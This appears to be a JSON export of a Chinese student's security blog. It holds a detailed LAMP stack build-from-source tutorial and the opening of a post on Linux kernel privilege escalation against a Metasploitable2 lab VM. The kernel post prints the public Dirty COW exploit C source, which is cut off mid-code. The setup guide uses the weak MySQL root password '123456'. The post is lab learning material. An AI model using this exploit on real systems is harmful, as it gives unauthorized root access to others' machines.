{"pages":[{"title":"关于","text":"信安专业普通大学生，方向是Web（本人很菜），会在博客上不定期更新自己的学习笔记和学习心得。 如果有大佬带带弟弟！！！ 没啥好东西分享，就放点表情包吧~ 最后奉上大佬的一句话！！！","link":"/about/index.html"}],"posts":[{"title":"LAMP环境搭建","text":"​ 参考文章： http://c.biancheng.net/linux_tutorial/16/ 源码包 如果安装过程中出现错误无法解决可以改换较高版本； Linux CentOS8，在虚拟机中搭建环境 http://mirrors.aliyun.com/centos/8.1.1911/isos/x86_64/CentOS-8.1.1911-x86_64-dvd1.iso Apache https://mirrors.tuna.tsinghua.edu.cn/apache//httpd/httpd-2.4.43.tar.gz mysql https://src.fedoraproject.org/lookaside/extras/community-mysql/mysql-5.5.39.tar.gz/md5/b6f0ba553fb1ac839921b1135cb184ae/mysql-5.5.39.tar.gz PHP https://www.php.net/distributions/php-5.5.23.tar.gz PHPmyadmin https://files.phpmyadmin.net/phpMyAdmin/4.1.4/phpMyAdmin-4.1.4-all-languages.zip libxml2_2.9.1.tar.gz http://xmlsoft.org/sources/libxml2-2.9.10.tar.gz libmerypt-2.5.8.tar.gz https://nchc.dl.sourceforge.net/project/mcrypt/Libmcrypt/2.5.8/libmcrypt-2.5.8.tar.gz mhash-0.9.9.9.tar.gz https://nchc.dl.sourceforge.net/project/mhash/mhash/0.9.9.9/mhash-0.9.9.9.tar.gz mcrypt-2-6.8-tar.gz https://nchc.dl.sourceforge.net/project/mcrypt/MCrypt/2.6.8/mcrypt-2.6.8.tar.gz zlib-1.2.11.tar.gz file:///D:/chrome/Downloads/zlib-1.2.11.tar.gz libgd-2.1.0.tar.gz https://bitbucket.org/libgd/gd-libgd/downloads/libgd-2.1.0.tar.gz freetype-2.4.0.tar.gz http://download.savannah.gnu.org/releases/freetype/freetype-2.4.0.tar.gz libpng-1.2.59.tar.gz ftp://ftp.simplesystems.org/pub/libpng/png/src/libpng12/libpng-1.2.59.tar.gz jpegsrc.v6b.tar.gz http://www.ijg.org/files/jpegsrc.v6b.tar.gz apr-1.4.6.tar.gz http://archive.apache.org/dist/apr/apr-1.4.6.tar.gz apr-util-1.4.1.tar.gz http://archive.apache.org/dist/apr/apr-util-1.4.1.tar.gz pcre-8.34.tar.gz http://sourceforge.net/projects/pcre/files/pcre/8.34/pcre-8.34.tar.gz ncurses-6.2.tar.gz（推荐） http://ftp.gnu.org/pub/gnu/ncurses/ncurses-6.2.tar.gz memcache-3.0.8.tgz http://pecl.php.net/get/memcache-3.0.8.tgz memcached-1.4.17.tar.gz http://www.memcached.org/files/memcached-1.4.17.tar.gz 解压脚本（一部分） 1234567891011121314151617181920[root@localhost ~]# vi tar.sh#建立解压缩脚本#! /bin/bash#标称是 Shell脚本cd /usr/local/src/#进入保存源妈包的目录ls *.tar.gz &gt; /usr/local/src/ls.log#把所有以.tar .gz结尾的文件名覆盖写入ls.log文件ls *.tgz &gt;&gt; /usr/local/src/ls.log#把所有以.tgz结尾的文件名追加写入ls.log文件file=$(cat /usr/local/src/ls.log)#读取 Is.log 文件中的内容,赋子变量filefor i in $file#for循环,每次德环把变量file中的一个文件名 do tar -zxf $i #解压缩毎个压缩文件 donerm -rf /usr/local/src/ls.log#删除临时文件ls.log Linux libxml2安装 先查看一下含python-devel的包 1yum search python | grep python-devel 安装python-devel 1yum -y install platform-python-devel.x86_64 进入解压缩之后的源码目录，因为 “./configure”、”make” 和 “make install” 操作的都是当前所在目录，所以一定要进入解压缩之后的源码目录 1cd /usr/local/src/libxml2-2.9.10 编译前的准备和配置，这一步主要检查安装需要的系统环境、配置软件需要的功能选项，并生成配置安装文件 Makefile，以后的编译与编译安装过程需要依赖 Makefile 文件 12./configure --prefix=/usr/local/libxml2/#“--prefix=/usr/local/libxml2/”用于指定安装位置 我们一般会将源码包安装到 /usr/local/ 目录中，这个目录是 Linux 的默认源码包安装目录，并不推荐大家随意更改。至于安装目录名称，如果只是单独安装这个软件，则目录名称可以随意指定，不一定非要叫“libxml2”。但是我们在搭建 LAMP 环境时，这个软件会被后面的软件所调用，如果修改了安装目录名称，那么后面一系列的安装命令都要进行修改，非常容易报错，所以不建议大家随意修改 编译，也就是依靠 gcc 把源码包翻译为二进制的机器语言包 1make 编译安装，这一步才会真正向 /usr/local/ 目录中写入数据，这条命令执行之后，就会建立 /usr/local/libxml2/ 目录，并在目录下生成相应的文件 1make install Linux libmcrypt安装 进入解压缩目录 1cd /usr/local/src/libmcrypt-2.5.8 编译前配置，并指定安装位置 1./configure --prefix=/usr/local/libmcrypt 编译 1make 编译安装 1make install 安装 libltdl 库，在安装完 libmcrypt 之后，有些 Linux 还需要安装 libltdl 库，这个库是 libmcrypt 的子软件，就在 libmcrypt 的源码包之中，所以要进入 /usr/local/libmcrypt 目录才能看到 1234cd /usr/local/src/libmcrypt-2.5.8/libltdl./configure --enable-ltdl-installmakemake install Linux mhash和mcrypt安装Linux mhash安装 12345678[root@localhost ~]# cd /usr/local/src/mhash-0.9.9.9#进入解压缩目录[root@localhost mhash-0.9.9.9]#./configure#没有指定安装位置。因为在mcrypt包安装时，会在默认位置查找mhash包，如果指定了安装位置，那么mcrypt包在安装时会报错[root@localhost mhash-0.9.9.9]# make#编译[root@localhost mhash-0.9.9.9]# make install#编译安装 Linux mcrypt安装 123456789[root@localhost ~]# cd /usr/local/src/mcrypt-2.6.8#进入源码目录[root@localhost mcrypt-2.6.8]# LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib ./configure --with-libmcrypt-prefix=/usr/local/libmcrypt#LD_LIBRARY_PATH用于指定libmcrypt和mhash库的位置#./configure为编译前准备命令，--prefix用于指定libmcrypt软件位置[root@localhost mcrypt-2.6.8]# make#编译[root@localhost mcrypt-2.6.8]# make install#编译安装 在这里 mcrypt 并没有安装完成。因为 mcrypt 是 PHP 的模块，所以需要等到 PHP 安装完成之后，再继续安装。 Linux zlib和libpng安装Linux zlib安装 12345678[root@localhost ~]# cd /usr/local/src/zlib-1.2.11#进入zlib解压缩目录[root@localhost zlib-1.2.11]# ./configure#编译前配置，没有指定安装位置，zlib会安装到系统的默认位置。这是为了让libpng可以在默认位置中找到zlib。如果指定了zlib的安装位置，那么libpng在安装时可能会报错[root@localhost zlib-1.2.11]# make#编译[root@localhost zlib-1.2.11]# make install#编译安装 Linux libpng安装 12345678[root@localhost zlib-1.2.11]# cd /usr/local/src/libpng-1.2.59#进入libpng解压缩目录[root@localhost libpng-1.2.59]# ./configure --prefix=/usr/local/libpng#编译前配置，指定安装位置[root@localhost libpng-1.2.59]# make#编译[root@localhost libpng-1.2.59]# make install#编译安装 Linux jpeg6安装 手工建立必需的目录 12345678910[root@localhost root]# mkdir /usr/local/jpeg6#建立jpeg6软件安装目录[root@localhost root]# mkdir /usr/local/jpeg6/bin#建立存放命令的目录[root@localhost root]# mkdir /usr/local/jpeg6/lib#创建jpeg6函数库文件所在目录[root@localhost root]# mkdir /usr/local/jpeg6/include#建立存放头文件的目录[root@localhost root]# mkdir -p /usr/local/jpeg6/man/man1#建立存放帮助手册的目录 注意，这些目录必须手工建立，否则安装过程会报错 编译与安装 123456789101112[root@localhost libpng-1.2.59]# cd /usr/local/src/jpeg-6b/#进入jpeg6解压缩目录[root@localhost jpeg-6b]# ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static#编译前配置#--prefix指定安装位置#--enable-shared建立共享库使用的GNU的libtool#--enable-static建立静态库使用的GNU的libtool[root@localhost jpeg-6b]# make#编译[root@localhost jpeg-6b]# make install#编译安装 在上面的过程中如果直接编译会出现如下报错： 出现报错是由于libtool版本过低所导致，重新下载新版本的libtool以默认方式安装即可，过程如下： 下载 1wget http://mirror.keystealth.org/gnu/libtool/libtool-2.4.6.tar.gz 如果下载慢的话可以先在windows中下载，然后再通过WinWPS上传到linux中；直接在linux centos中下载记得要打开网络； 下载完成后将libtool-2.4.6.tar.gz放到/usr/local/src目录下； 安装 1234567891011#进入/usr/local/src目录cd /usr/local/src#解压缩源码包tar -zxvf libtool-2.4.6.tar.gz#进入libtool-2.4.6目录cd libtool-2.4.6#配置编译安装./configuremakemake install 修改配置文件 进入jpeg-6b的源码目录，执行以下步骤 ： 12cp /usr/share/libtool/build-aux/config.sub ./cp /usr/share/libtool/build-aux/config.guess ./ 重新安装jpeg6 1234cd /usr/local/src/jpeg-6b/./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-staticmakemake install Linux freetype安装12345678[root@localhost jpeg-6b]# cd /usr/local/src/freetype-2.4.0#进入freetype解压缩目录[root@localhost freetype-2.4.0]# ./configure --prefix=/usr/local/freetype#编译前配置，指定安装位置[root@localhost freetype-2.4.0]# make#编译[root@localhost freetype-2.4.0]# make install#编译安装 Linux gd库安装 进入 gd 库解压缩目录 1[root@localhost ~]# cd /usr/local/src/libgd-2.1.0 修改gd_png.c文件 12[root@localhost libgd-2.1.0]# vim ./src/gd_png.c#把文件中 include \"png.h\"改为 include \"/usr/local/libpng/include/png.h\" 如果不修改 gd_png.c 文件，则默认会在当前目录下搜索 png.h 文件；因为 libpng 安装在 /usr/local/libpng/ 目录中，所以在当前目录不能找到，就会报错；把 png.h 的正确路径“/usr/local/libpng/include/png.h”写入，报错就能解决。； 编译安装 1234567891011[root@localhost libgd-2.1.0]# ./configure --prefix=/usr/local/gd2 --with-jpeg=/usr/local/jpeg6 --with-freetype=/usr/local/freetype --with-png=/usr/local/libpng--prefix #指定安装位置--with-jpeg #指定jpeg6的位置--with-freetype #指定freetype的位置--with-png #指定libpng的位置#编译前配置#因为gd库需要调用前面安装的zlib、jpeg、freetype和libpng，所以需要指定它们的安装位置，才能正确调用这些软件。不过因为前面安装zlib时没有指定安装位置，所以不用指定——with-zlib=/usr/local/zlib/选项，gd会自动到默认安装位置中寻找zlib[root@localhost libgd-2.1.0]# make#编译[root@localhost libgd-2.1.0]# make install#编译安装 Linux Apache安装 复制 apr 和 apr-util 库，这里是 Apache 2.4 自己的 Bug，我们必须手工复制 apr、apr-util 和 pcre 这三个库，才可以正确安装 Apache 2.4； 123cp -r /usr/local/src/apr-1.4.6 /usr/local/src/httpd-2.4.43/srclib/aprcp -r /usr/local/src/apr-util-1.4.1 /usr/local/src/httpd-2.4.43/srclib/apr-util#这两个包先要解压缩，然后改名复制到指定位置 安装 pcre 源码包，pcre 是一个用 C 语言编写的正则表达式函数库，Apache 和 PHP 默认使用的就是 pcre 正则表达式规则 ； 12345678[root@localhost ~]# cd /usr/local/src/pcre-8.34#进入解压缩目录[root@localhost pcre-8.34]# ./configure#编译前配置[root@localhost pcre-8.34]# make#编译[root@localhost pcre-8.34]# make install#编译安装 进入 Apache 解压缩目录 1[root@localhost pcre-8.34]# cd /usr/local/src/httpd-2.4.43 编译前配置 12345678[root@localhost httpd-2.4.43]# ./configure --prefix=/usr/local/apache2 --sysconfdir=/usr/local/apache2/etc --with-included-apr --enable-so --enable-deflate=shared --enable-expires=shared --enable-rewrite-shared--prefix #指定Apache安装目录--sysconfdir #指定Apache配置文件保存目录--with-included-apr #使用捆绑APR/APR-Util 的副本--enable-so #以动态共享对象(DSO)方式编译--enable-deflate=shared #启用编小传输编玛支持的模块--enable-expires=shared #根据用户的特别设定来生成失效和隐藏控制的HTTP头信息--enable-rewrite-shared #启动重写功能的模块 编译安装 12[root@localhost httpd-2.4.43]# make[root@localhost httpd-2.4.43]# make install 启动Apache，并进行测试 12345[root@localhost httpd-2.4.43]# /usr/local/apache2/bin/apachectl start#启动Apache[root@localhost httpd-2.4.43]# netstat -tlun | grep 80tcp6 0 0 :::80 :::* LISTEN #80端口已经启动，说明Apache已经启动了 用浏览器测试一下Apache服务器是否可以访问； 设置 Apache 开机自启 123vim /etc/rc.d/rc.local #在文件中加入apache启动命令/usr/local/apache2/bin/apachectl start Linux ncurses安装123456789[root@localhost ~]# cd /usr/locai/src/ncurses-6.2#进入ncurses解压缩目录[root@localhost ncurses-6.2]# ./configure --with-shared --without-debug --without-ada --enable-overwrite --with-shared #生成共享库--without-debug #不生成 debug 库--without-ada #不编译为ada绑定，因为进入chroot环境不能用ada--enable-overwrite #定义把头文件安装到/tools/include目录下，而不是/tools/include/ncurses 目录下[root@localhost ncurses-6.2]# make [root@localhost ncurses-6.2)# make install Linux MySQL安装 添加 mysql 用户和 mysql 用户组 1234[root@localhost ~]# groupadd mysql#添加mysql用户组[root@localhost ～]# useradd -g mysql mysql#添加mysql用户，同时指定mysql用户的初始组是mysql组 这里添加的 mysql 用户和用户组是稍后用来给 MySQL 安装目录分配权限用的，所以并不需要设定密码，因为这个用户是不能直接登录 Linux 系统的 ； 安装 cmake命令 123yum -y install cmakeyum -y install bisonyum -y install gcc gcc-c++ ncurses ncurses-devel 进入 MySQL 解压缩目录 1[root@localhost ~]# cd /usr/local/src/mysql-5.5.39 编译前配置 123456789101112131415[root@localhost mysql-5.5.39]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DEXTRA_CHARSETS=all -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_USER=mysql -DMYSQL_TCP_PORT=3306-DCMAKE_INSTALL_PREFIX=/usr/local/mysql #指定安装位置-DMYSQL_UNIX_ADDR=/tmp/mysql.sock #指定socket（套接字）文件位置-DEXTRA_CHARSETS=all #支持所有的扩展字符集-DDEFAULT_CHARSET=utf8 #指定默认字符集-DDEFAULT_COLLATION=utf8_general_ci #指定默认字符校对-DWITH_MYISAM_STORAGE_ENGINE=1 #安装myisam存储引擎-DWITH_INNOBASE_STORAGE_ENGINE=1 #安装innodb存储引擎-DWITH_MEMORY_STORAGE_ENGINE=1 #安装memory存储引擎-DWITH_READLINE=1 #支持readline库-DENABLED_LOCAL_INFILE=1 #启用加载本地数据-DMYSQL_USER=mysql #指定MySQL运行用户-DMYSQL_TCP_PORT=3306 #指定MySQL端口 编译安装 12[root@localhost mysql-5.5.39]# make[root@localhost mysql-5.5.39]# make install 在编译的时候出现错误： 解决方法： 12vim /usr/local/src/mysql-5.5.39/client/mysql.cc#在第2658行的'\\0'q\\前面加上(char*)，强制转换为字符指针 重新配置，编译安装 生成MySQL的配置文件，并修改配置文件；这个配置文件不用手工建立，在 MySQL 安装目录中给我们准备了模板文件，只需把模板文件复制到指定位置并改名即可 1[root@localhost mysql-5.5.39]# cp /usr/local/mysql/support-files/my-medium.cnf /etc/my.cnf 修改 MySQL 安装目录的权限 123456[root@localhost mysql-5.5.39]# cd /usr/local/mysql#进入MySQL安装目录[root@localhost mysql]# chown -R root /usr/local/mysql#把当前目录下所有文件的所有者改为root用户[root@localhost mysql]# chgrp -R mysql /usr/local/mysql#把当前目录下所有文件的所属组改为mysql组 初始化数据库；源码包安装的 MySQL 中所有的数据库默认都保存在 /usr/local/mysql/data/ 目录中，MySQL 的初始数据库 mysql 库和 test 库也会保存在这个目录中；但是，如果仔细查看 /usr/local/mysql/data/ 目录，就会发现这个目录中只有两个空目录，并没有任何数据。也就是说，MySQL 中的所有数据库是不存在的，那么这个 MySQL 是不能使用的，因为 MySQL 的所有用户是要保存在 user 表中的，而 user 表保存在 mysql 库中，而 mysql 库是保存在 /usr/local/mysql/data/ 目录中的；那么，我们现在需要在 data 目录中建立 MySQL 的初始数据库 ； 1/usr/local/mysql/scripts/mysql_install_db --user=mysql 继续修改MySQL安装目录的权限 1234[root@localhost mysql]# chown -R root /usr/local/mysql#把当前目录下所有文件的所有者改为root用户[root@localhost mysql]# chown -R mysql /usr/local/mysql/data#把data目录的所有者改为mysql用户 启动 MySQL 服务器，并保证 mysql 服务开机自启动； MySQL 服务器的安装已经完成，我们可以尝试启动 MySQL 服务器： 1234[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql &amp;#使用mysql用户启动MySQL服务器，并在后台持续运行[root@localhost ~]# netstat -tlun | grep 3306tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 设置 mysql 服务开机自启动 ； 123[root@localhost ~]# vim /etc/rc.local#修改自启动配置文件，加入如下的mysql服务标准启动命令/usr/local/mysql/bin/mysqld_safe --user=mysql &amp; 设定 MySQL 中 root 用户的密码，并登录； MySQL 数据库的管理员也是 root，我们需要给 MySQL 的本地用户设定一个密码，这里使用 Linux 的命令 mysqladmin 设定 MySQL 的 root 用户的密码 123456789101112131415161718192021222324252627282930313233343536373839404142434445[root@localhost mysql]# /usr/local/mysql/bin/mysqladmin -u root password 123456#给MySQL的root用户设定密码为123456[root@localhost mysql]# /usr/local/mysql/bin/mysql -u root -p#使用root用户登录mysqlEnter password： #输入正确的密码Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 5Server version: 5.5.39-log Source distributionCopyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; #看到了MySQL的交互界面mysql&gt; \\s #查询服务器状态信息--------------/usr/local/mysql/bin/mysql Ver 14.14 Distrib 5.5.39, for Linux (x86_64) using readline 5.1Connection id: 6Current database: Current user: root@localhostSSL: Not in useCurrent pager: stdoutUsing outfile: ''Using delimiter: ;Server version: 5.5.39-log Source distributionProtocol version: 10Connection: Localhost via UNIX socketServer characterset: utf8Db characterset: utf8Client characterset: utf8Conn. characterset: utf8UNIX socket: /tmp/mysql.sockUptime: 16 min 56 secThreads: 1 Questions: 11 Slow queries: 0 Opens: 33 Flush tables: 2 Open tables: 0 Queries per second avg: 0.010--------------mysql&gt; exit#退出MySQL Linux安装PHP 安装libtool和libtool-ltdl 12[root@localhost ~]# yum -y install \"libtool*\"[root@localhost ~]# yum -y install \"libtool-ltdl*\" 编译安装 php 源码包 12345678910111213141516171819202122232425[root@localhost mysql]# cd /usr/local/src/php-5.5.23[root@localhost php-5.5.23]# ./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/local/mysql --with-libxml-dir=/usr/local/libxml2 --with-jpeg-dir=/usr/local/jpeg6 --with-png-dir=/usr/local/libpng --with-freetype-dir=/usr/local/freetype --with-gd --with-mcrypt=/usr/local/libmcrypt --with-mysqli=/usr/local/mysql/bin/mysql_config --enable-soap --enable-mbstring=all --enable-sockets --with-pdo-mysql=/usr/local/mysql--prefix=/usr/local/php #指定安装位置--with-config-file-path=/usr/local/php/etc #指定PHP配置文件位置--with-apxs2=/usr/local/apache2/bin/apxs #调用apache2--with-mysql=/usr/local/mysql #调用mysql--with-libxml-dir=/usr/local/libxml2 #调用libxml2库--with-jpeg-dir=/usr/local/jpeg6 #调用jpeg库--with-png-dir=/usr/local/libpng #调用libpng库--with-freetype-dir=/usr/local/freetype #调用freetype库--with-gd #调用gd库，不指定就会利用php自带的gd source编译--with-mcrypt=/usr/local/libmcrypt #调用libmcrypt库--with-mysqli=/usr/local/mysql/bin/mysql_config #增加MysqlLi功能--enable-soap #支持SOAP和Web Services--enable-mbstring=all #支持多字节字符串--enable-sockets #支持socket（套接字）通信--with-pdo-mysql=/usr/local/mysql #启用mysql的pdo模块支持[root@localhost php-5.5.23]# make#编译[root@localhost php-5.5.23]# make install#编译安装 建立PHP配置文件，这个配置文件不用手工建立，也是有模板文件的，只需复制即可 1[root@localhost php-5.5.23]# cp /usr/local/src/php-5.5.23/php.ini-production /usr/local/php/etc/php.ini 让apache可以识别“.php”扩展名 在安装 PHP 时，在 ./configure 命令中使用 –with-apxs2=/usr/local/apache2/bin/apxs 选项，已经把 PHP 作为模块被 apache 识别了；但是，apache 并不知道哪些扩展名的文件要调用 PHP 模块来解析（如果是 apache 不认识的扩展名，那么客户端在访问时，apache 不会尝试解析，而是提示客户端下载），所以我们需要修改 apache 的配置文件，让 apache 可以识别PHP 脚本的扩展名 ； 1234[root@localhost php-5.5.23]# vim /usr/local/apache2/etc/httpd.conf#修改apache配置文件，加入如下内容AddType application/x-httpd-php .php .phps#这句话的意思是：如果遇到.php和.phps扩展名，则调用PHP模块来解析这个文件的内容 重启Apache服务器；我们修改了 apache 的配置文件，如果想让这个修改生效，那么必须重启 Apache 服务器； 12[root@localhost php-5.5.23]# /usr/local/apache2/bin/apachectl stop[root@localhost php-5.5.23]# /usr/local/apache2/bin/apachectl start 这里最好不要使用 restart 参数，因为对于源码包的 apache 启动命令，restart 参数有时会不起作用 ； 测试PHP环境是否正常；对源码包安装的 apache 来讲，网页的默认保存位置是 /usr/local/apache2/htdocs/ 目录。为了测试 PHP 环境是否正常，我们需要在这个目录中建立一个 PHP 文件，看看这个文件是否可以正常显示 ; 1234[root@localhost php-5.5.23]# vim /usr/local/apache2/htdocs/index.php&lt;?php phpinfo();?&gt; 用浏览器访问index.php; 继续安装 mcrypt 因为 mcrypt 是 PHP 的模块，所以需要等到 PHP 安装完成之后，才能按照以下步骤继续安装 mcrypt； 编译安装 12345678910111213[root@localhost ~]# cd cd /usr/local/src/php-5.5.23/ext/mcrypt#进入PDO模块的解压缩目录[root@localhost mcrypt]# /usr/local/php/bin/phpize#使用phpize加载PDO模块[root@localhost mcrypt]# ./configure --with-php-config=/usr/local/php/bin/php-config --with-mcrypt=/usr/local/libmcrypt--with-php-config=/usr/local/php/bin/php-config #指定php-config文件的位置--with-mcrypt=/usr/local/libmcrypt #调用libmcrypt[root@localhost mcrypt]# make#编译[root@localhost mcrypt]# make install#编译安装 修改PHP配置文件，要想让 PHP 可以识别和使用 memcache 和 mcrypt 模块，还需要修改一下 PHP 的配置文件；这里要先安装memcache（“Linux memcache安装和配置（自启动）”）； 12345678[root@localhost mcrypt]# vim /usr/local/php/etc/php.ini#修改PHP配置文件extension_dir = \"./\"#在文件中找到上面这句话，把它改成下面这句extension_dir=\"/usr/local/php/lib/php/extensions/no-debug-zts-20121212/\"#在加入以下两句话; extension=\"memcache.so\"; extension=\"mcrypt.so\" 安装完成之后，重启 apache，就可以在 phpinfo 页面中看到这两个模块了； 12[root@localhost php-5.5.23]# /usr/local/apache2/bin/apachectl stop[root@localhost php-5.5.23]# /usr/local/apache2/bin/apachectl start Linux memcache安装和配置（自启动）memcache客户端安装 123456789101112[root@localhost src]# yum -y install zlib-devel#安装底层依赖包zlib-devel[root@localhost src]# cd /usr/local/src/memcache-3.0.8#进入memcache-3.0.8解压缩目录[root@localhost memcache-3.0.8]# /usr/local/php/bin/phpize#用phpize加载memcache模块；这条命令一定要进入memcache目录才能正确执行[root@localhost memcache-3.0.8]# ./configure --with-php-config=/usr/local/php/bin/php-config#编译前配置，指定php-config文件的位置[root@localhost memcache-3.0.8]# make#编译[root@localhost memcache-3.0.8]# make install#编译安装 memcache服务器端安装 安装 memcached-1.4.17 服务器端程序 ： 1234567891011121314151617181920[root@localhost ~]cd /usr/local/src/memcached-1.4.17[root@localhost memcached-1.4.17]# yum -y install libevent-devel#安装memcache，需要先安装libevent-devel包[root@localhost memcached-1.4.17]# ./configure --prefix=/usr/local/memcache#编译前配置[root@localhost memcached-1.4.17]# make#编译[root@localhost memcached-1.4.17]# make install#编译安装[root@localhost memcached-1.4.17]# useradd memcache#添加memcache用户，这个用户只是用来启动服务的，不用设置密码[root@localhost memcached-1.4.17]#/usr/local/memcache/bin/memcached -u memcache &amp;#在后台启动memcache服务器[root@localhost memcached-1.4.17]# netstat -tlun | grep 11211tcp 0 0 0.0.0.0:11211 0.0.0.0:* LISTENtcp 0 0::11211 ::* LISTENudp 0 0 0.0.0.0:11211 0.0.0.0：*udp 0 0::11211 ::*#memcache的端口是11211，已经启动了 还要保证 memcache 开机自启动，命令如下： 1234567[root@localhost memcached-1.4.17]# vim /etc/rc.local#修改自启动文件touch /var/lock/subsys/local/usr/local/apache2/bin/apachectl start/usr/local/mysql/bin/mysqld_safe --user=mysql &amp;/usr/local/memcache/bin/memcached -u memcache &amp;#加入memcache启动命令 最终，LAMP 环境需要自启动的服务是 apache、mysql 和 memcache。 linux phpmyadmin安装及配置复制 phpMyAdmin 脚本文件/usr/local/apache2/中的htdocs相当于网站根目录WWW； 123456[root@localhost ~]# cp -r /usr/local/src/phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin#改名复制phpMyAdmin到apache的默认网页目录中[root@localhost ~]# cd /usr/local/apache2/htdocs/phpmyadmin/#进入phpmyadmin目录[root@localhost phpmyadmin]# cp config.sample.inc.php config.inc.php#复制配置模板文件为真正的配置文件 phpMyAdmin 和前面章节中介绍安装的源码包都不太一样，不再是使用 C 语言编写的源码包程序，而是一个使用 PHP 脚本编写的、通过浏览器解释执行的网站项目。所以在安装时，只需把 phpMyAdmin 复制到 apache 的默认网页目录中，并通过浏览器来解释执行这个脚本即可。 修改 phpMyAdmin 的验证方式 phpMyAdmin 默认识别 3 种验证方式： HTTP 身份验证：调用apache的加密目录模块，在用户登录时，弹出登录窗口，需要输入正确的用户名和密码才能正常登录； cookie 身份验证：是HTTP身份验证模式的补充，不能使用HTTP身份验证模式的场合都可以使用它，它要求用户必须允许来自phpMyAdmin的cookie进入自己的计算机，即用户需要在浏览器中开启客户端的cookie功能； config 身份验证：客户端在登录时不再需要输入用户名和密码，就可以直接登录，因为用户名和密码是用明文方式写入config.inc.php配置文件的，所以这种验证方式并不安全，不推荐使用； HTTP身份验证配置；要想使用 HTTP 身份验证，只需要修改 PHP 的配置文件 config.inc.php，把验证方式改为“http”即可； 123[root@localhost phpmyadmin]# vim config.inc.php把 $cfg['Servers'][$i]['auth_type'] = 'cookie';改为 $cfg['Servers'][$i]['auth_type'] = 'http'; 保存退出后，就可以在浏览器中输入“http://127.0.0.1/phpmyadmin/index.php”进行访问了； 在登录对话框中输入 MySQL 的管理员“root”和我们刚刚安装 MySQL 时设定的密码“123456”就能登录 phpMyAdmin了。 到这里网站就基本搭建好了，可以开始接下来的入坑之路了。","link":"/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"title":"浅谈Linux内核提权","text":"​ 提权的前提是已经获得了目标主机上的一个低权限的shell。 实验环境： kali：192.168.43.52 Metasploitable2：192.168.43.41 0x1 信息收集123uname -a //查看系统内核版本lsb_release -a //查看系统发行版本getconf LONG_BIT //查看系统位数 内核版本：2.6.24 系统发行版本：Ubuntu 8.04 系统位数：32 https://blog.csdn.net/qq_31278903/article/details/83146031 0x2 查找Poc/Exp这里需要用到两个工具： searchsploit（kali自带） linux-exploit-suggester linux-exploit-suggester这里首先演示linux-exploit-suggester工具。 123./linux-exploit-suggester.sh -u \"Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\" -p ./pkglist-file//-u参数接收内核版本信息，也就是\"uname -a\"命令输出的内容//-k参数接收\"dpkg -l\"命令的输出内容，可以先在靶机的shell上将\"dpkg -l\"命令的执行结果输出到一个文件中，然后再用nc将文件传到kali主机上 linux-exploit-suggester.sh提示可能存在dirtycow（脏牛）漏洞，根据它提供的信息访问相关网站查看漏洞详情以及相关的poc和exp。 前面那个dirtycow提供的是poc，后面那个dirtycow 2提供的是exp。 将两个文件下载到本地，查看源码； 40611： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115root@kali:/usr/share/linux-exploit-suggester# cat 40611 /*####################### dirtyc0w.c #######################$ sudo -s# echo this is not a test &gt; foo# chmod 0404 foo$ ls -lah foo-r-----r-- 1 root root 19 Oct 20 15:23 foo$ cat foothis is not a test$ gcc -pthread dirtyc0w.c -o dirtyc0w$ ./dirtyc0w foo m00000000000000000mmap 56123000madvise 0procselfmem 1800000000$ cat foom00000000000000000####################### dirtyc0w.c #######################*/#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;void *map;int f;struct stat st;char *name; void *madviseThread(void *arg){ char *str; str=(char*)arg; int i,c=0; for(i=0;i&lt;100000000;i++) {/*You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call&gt; while having the page of the executable mmapped in memory.*/ c+=madvise(map,100,MADV_DONTNEED); } printf(\"madvise %d\\n\\n\",c);} void *procselfmemThread(void *arg){ char *str; str=(char*)arg;/*You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16&gt; The in the wild exploit we are aware of doesn't work on Red Hat&gt; Enterprise Linux 5 and 6 out of the box because on one side of&gt; the race it writes to /proc/self/mem, but /proc/self/mem is not&gt; writable on Red Hat Enterprise Linux 5 and 6.*/ int f=open(\"/proc/self/mem\",O_RDWR); int i,c=0; for(i=0;i&lt;100000000;i++) {/*You have to reset the file pointer to the memory position.*/ lseek(f,(uintptr_t) map,SEEK_SET); c+=write(f,str,strlen(str)); } printf(\"procselfmem %d\\n\\n\", c);} int main(int argc,char *argv[]){/*You have to pass two arguments. File and Contents.*/ if (argc&lt;3) { (void)fprintf(stderr, \"%s\\n\", \"usage: dirtyc0w target_file new_content\"); return 1; } pthread_t pth1,pth2;/*You have to open the file in read only mode.*/ f=open(argv[1],O_RDONLY); fstat(f,&amp;st); name=argv[1];/*You have to use MAP_PRIVATE for copy-on-write mapping.&gt; Create a private copy-on-write mapping. Updates to the&gt; mapping are not visible to other processes mapping the same&gt; file, and are not 